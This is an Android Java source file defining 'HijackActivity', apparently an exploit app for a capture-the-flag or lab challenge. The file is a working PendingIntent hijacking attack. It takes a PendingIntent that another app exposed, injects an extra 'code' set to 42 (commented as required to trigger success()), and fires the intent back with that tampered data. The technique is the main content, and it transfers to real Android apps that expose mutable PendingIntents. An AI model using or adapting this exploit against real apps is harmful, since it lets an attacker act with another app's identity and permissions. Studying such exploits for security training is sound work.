package com.android.zerohextree;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityHijackBinding;

public class HijackActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Extract the PendingIntent from the received intent
        PendingIntent pendingIntent = getIntent().getParcelableExtra("pending_intent");

        // Modify the PendingIntent's extras to include code=42
        Intent modifiedIntent = new Intent();
        modifiedIntent.putExtra("code", 42); // Required to trigger success()

        try {
            // Send the modified PendingIntent
            pendingIntent.send(this, 0, modifiedIntent);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }

        finish(); // Close the activity
    }
}